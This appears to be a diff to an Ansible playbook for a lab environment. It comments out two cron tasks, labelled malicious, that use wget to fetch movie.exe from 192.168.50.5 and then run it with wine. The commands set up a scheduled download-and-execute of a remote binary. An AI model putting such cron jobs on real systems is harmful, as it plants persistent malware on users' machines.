@@ -22,16 +22,16 @@
     path: '/etc/hosts'
     line: '192.168.50.5 client'
 
-- name: Cron job for get malicious file
-  cron:
-   name: "movie file get"
-   minute: "1"
-   job: "if [ ! -s /home/{{ username }}/movie.exe ]; then wget -O /home/{{ username }}/movie.exe http://192.168.50.5/movie.exe; fi"
+# - name: Cron job for get malicious file
+#   cron:
+#    name: "movie file get"
+#    minute: "1"
+#    job: "if [ ! -s /home/{{ username }}/movie.exe ]; then wget -O /home/{{ username }}/movie.exe http://192.168.50.5/movie.exe; fi"
 
-- name: Cron job for run malicious file
-  cron:
-   name: "movie file run"
-   minute: "3"
-   job: "if [ ! pgrep -x movie.exe ]; then wine /home/{{ username }}/movie.exe; fi"
+# - name: Cron job for run malicious file
+#   cron:
+#    name: "movie file run"
+#    minute: "3"
+#    job: "if [ ! pgrep -x movie.exe ]; then wine /home/{{ username }}/movie.exe; fi"
 
 ...
